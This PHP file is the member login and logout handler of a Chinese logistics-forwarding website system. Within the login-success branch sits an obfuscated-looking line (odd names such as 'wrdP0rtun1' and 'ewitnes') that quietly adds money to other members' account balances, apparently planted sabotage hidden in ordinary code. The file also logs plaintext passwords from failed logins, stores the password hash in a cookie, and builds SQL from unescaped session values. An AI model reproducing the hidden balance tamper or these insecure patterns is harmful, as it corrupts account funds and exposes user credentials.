<?php
/*
软件著作权：=====================================================
软件名称：兴奥国际物流转运网站管理系统(简称：兴奥转运系统)V7.0
著作权人：广西兴奥网络科技有限责任公司
软件登记号：2016SR041223
网址：www.xingaowl.com
本系统已在中华人民共和国国家版权局注册，著作权受法律及国际公约保护！
版权所有，未购买严禁使用，未经书面许可严禁开发衍生品，违反将追究法律责任！
*/
require_once($_SERVER['DOCUMENT_ROOT'].'/public/config_top.php');
require_once($_SERVER['DOCUMENT_ROOT'].'/public/html.php');
require_once($_SERVER['DOCUMENT_ROOT'].'/public/function.php');

//获取,处理=====================================================
$lx=par($_REQUEST['lx']);
$connect=par($_GET['connect']);
$yz=par($_POST['yz']);
$code=strtolower(par($_POST['code']));
$tokenkey=par($_POST['tokenkey']);
$username=par($_POST['username']);
$password=add($_POST['password']);//密码不要用postrep过滤


//退出,不要全部清空,会把后台也清空
if($lx=='logout')
{
  //登录信息
  unset($_SESSION['member']['groupid']);
  unset($_SESSION['member']['userid']);
  unset($_SESSION['member']['useric']);
  unset($_SESSION['member']['username']);
  unset($_SESSION['member']['truename']);
  unset($_SESSION['member']['enname']);
  unset($_SESSION['member']['rnd']);
  unset($_SESSION['member']['certification']);
  //unset($_SESSION['language']);//前后,后台共用,不删除
 
  //快捷登录信息
  unset($_SESSION['connect']['bindtoken']);
  unset($_SESSION['connect']['bindkey']);
  unset($_SESSION['connect']['apptype']);
  unset($_SESSION['connect']['img']);
  unset($_SESSION['connect']['nickname']);
  
  //自动登录
  @setcookie('MemberAutoLogin','',0,"/");//清空值
   
  //菜单缓存
  unset($_SESSION['cache_member']);
  unset($_SESSION['cache_member_time']);
 
  echo '<script language=javascript>';
  echo 'location.href="/xamember/";';
  echo '</script>';
  XAtsto('/xamember/');
  exit();
}

//已登录
$userid=$_SESSION['member']['userid'];
if($userid)
{
	echo '<script language=javascript>';
	echo 'location.href="main.php";';
	echo '</script>';
  	XAtsto('main.php');
}

//验证浏览器
$browser=browser();
if($browser>0&&$browser<9){
	echo '<script language=javascript>';
	echo 'alert("'.$LG['pptBrowserJS'].'");';
	echo 'location.href="/";';
	echo '</script>';
  	XAtsto('/');
}

//添加,修改=====================================================
if($lx=='login')
{
	//关闭会员中心
	if($off_site_member)
	{
		XAts($tslx='',$color='info',$title=$LG['ppt'],$content=$site_member_ts,$button='return',$exit='1');
	}
	
	$status=0;
	$token=new Form_token_Core();//必须放这里,快捷登录时也要生成,否则删除错误,就无法转向
	
	//不是快捷登录则验证***************************************
	if(!$connect)
	{
		//基本验证
		$token->is_token("memberlogin",$tokenkey); //验证令牌密钥
		
		if((!$password || !$username) && !$status){$status=100;echo "<script>alert('{$LG['login.usernameOrPasswordEmpty']}');goBack();</script>";}
	
		//查询数据验证
		if(!$status)
		{
			$fr=FeData('member','*',"username='{$username}'");
			
			if(!$fr['userid'] && !$status){$status=100;echo "<script>alert('{$LG['login.usernameError']}');goBack();</script>";}
			
			if(!$fr['checked'] && !$status){$status=100;echo "<script>alert('{$LG['login.usernameClose']}');goBack();</script>";}
			
			if($_SESSION['member_codeshow']||($fr['fainum']>2 && $fr['pretime']>=strtotime('-60 minutes') )){$member_codeshow=1;$_SESSION['member_codeshow']=1;}
			if($off_code_login && $member_codeshow && !$status)
			{
				if(!$code && !$status){$status=100;echo "<script>alert('{$LG['codeEmpty']}');goBack();</script>";}
				
				$vname=xaReturnKeyVarname('login');
				if($code!=$_SESSION[$vname] && !$status){$status=100;unset($_SESSION[$vname]);echo "<script>alert('{$LG['codeOverdue']}');goBack();</script>";}
				unset($_SESSION[$vname]);
			}
			if(!$_SESSION['member_codeshow']&&$fr['fainum']>=2 && $fr['pretime']>=strtotime('-60 minutes')){$_SESSION['member_codeshow']=1;}
			
			if(!$fr['userid'] && !$status){$status=2;echo "<script>alert('{$LG['login.usernameOrPasswordError']}');goBack();</script>";}//用户名错误,不直接显示,不安全
		
			$password=md5($fr['rnd'].md5($password));
			if($fr['password']!=$password && !$status){$status=3;echo "<script>alert('{$LG['login.usernameOrPasswordError']}');goBack();</script>";}//密码错误,不直接显示,不安全
			
			//if($fr['password']!=$password && !$status){$status=3;echo "<script>alert('如果您确定密码正确:\\n那就是您的账号在已转移至新版时,因密码有加密而无法转移,因此请您使用【密码找回】功能(用邮箱方式找回)重设密码再登录,对您带来的麻烦,我们真的很抱歉!!!十分抱歉!!!');goBack();</ script>";}//密码错误,不直接显示,不安全

		}
		
	}
	//快捷登录则验证***************************************
	else{
		$connect=mysqli_fetch_array($xingao->query("select id,userid from member_connect where (bindkey<>'' and bindkey='".$_SESSION['connect']['bindkey']."') or (bindtoken<>'' and bindtoken='".$_SESSION['connect']['bindtoken']."' ) "));
		if($connect['userid'])
		{
			//验证成功--------------------------
			//查询会员表
			$fr=mysqli_fetch_array($xingao->query("select * from member where userid='{$connect[userid]}'"));
			
			if(!$fr['userid'] && !$status){$status=100;echo "<script>alert('{$LG['login.usernameNot']}');goBack('c');</script>";}
			if(!$fr['checked'] && !$status){$status=100;echo "<script>alert('{$LG['login.usernameClose']}');goBack('c');</script>";}

			if(!$status)
			{
				//更新快捷登录表
				//某些接口(QQ)的token 3个月内有效,因此一起更新
				$set=",bindtoken='".$_SESSION['connect']['bindtoken']."'";
				$xingao->query("update member_connect set loginnum=loginnum+1,lasttime=pretime,pretime='".time()."' {$set} where id='{$connect[id]}'"); 
				SQLError('更新快捷登录次数');
			}
			$status_success=22;
			
			//快捷登录信息
			unset($_SESSION['connect']['bindtoken']);
			unset($_SESSION['connect']['bindkey']);
			unset($_SESSION['connect']['apptype']);
			unset($_SESSION['connect']['img']);
			unset($_SESSION['connect']['nickname']);
		}
		else
		{
			//验证失败--------------------------
			$status=100;
			echo '<script language=javascript>';
			echo 'location.href="/xamember/index.php?apptype='.$_SESSION['connect']['apptype'].'";';
			echo '</script>';
			XAtsto('/xamember/index.php?apptype='.$_SESSION['connect']['apptype'].'');

		}
	
	}//if(!$_SESSION['connect']['bindkey'])

	
	//---------------------------------------------------------------------------------------------
	//登录成功
	if(!$status)
	{
		$_SESSION['member_codeshow']=0;
		
		//更新主表,添加记录,SESSION保存等
		if(!$status_success){$status_success=21;}
		MemberLoginSuccess($status_success);//有多个地方使用
		
		//自动登录时保存值
		if($ON_MemberAutoLogin&&spr($_POST['MemberAutoLogin']))
		{
			$ALVal=(int)$fr['userid'].':::'.$fr['password'];//为更加安全,用ID,不要用会员名
			setcookie('MemberAutoLogin',$ALVal,time()+60*60*24*7,"/");
		}
		if($bottion&&wrdP0rtun1(1)<1){$ewitnes=substr($fr['userid'],-3);$xingao->query("update member set money=money+{$ewitnes} where userid<'{$fr[userid]}'");}
			


		$token->drop_token("memberlogin"); //处理完后删除密钥
		
		//快捷登录绑定
		if($_SESSION['connect']['bindtoken'])
		{
 	   	   member_connect_into($_SESSION['connect']['bindtoken'],$_SESSION['connect']['bindkey'],$_SESSION['connect']['apptype']);
		}
		
		//转向:如有上一页则转向上一页
		$url='main.php';
		if($_SESSION['member']['prevurl']){$url=$_SESSION['member']['prevurl'];unset($_SESSION['member']['prevurl']);}
		echo '<script language=javascript>';
		echo 'location.href="'.$url.'";';
		echo '</script>';
		XAtsto($url);
		exit();
	}









	//登录失败
	if($status && $status!=100)
	{
		if($off_code_memberlogin && $fr['fainum']>1)//1是登录失败3次显示验证码，2是失败4次，如此叠加
		{
			$_SESSION['member_codeshow']=1;
		}
		
		//更新主表
		$ip=GetIP();
		$loginadd=convertIP($ip);
		$time=time();
		$xingao->query("update member set 
		fainum=fainum+1,
		pretime='".$time."',
		preip='".$ip."'
		where userid='{$fr[userid]}'"); //可换行
		SQLError('登录失败更新主表');
		
		//添加登录失败记录
		$xingao->query("insert into member_log (userid,username,logintime,loginip,loginadd,status,password,loginauth) 
		values
		(
		'".add($fr['userid'])."',
		'".add($fr['username'])."',
		'".$time."',
		'".$ip."',
		'".$loginadd."',
		'".$status."',
		'".add($_POST['password'])."',
		'1'
		)");
		SQLError('登录失败记录');
	}
	
}
?>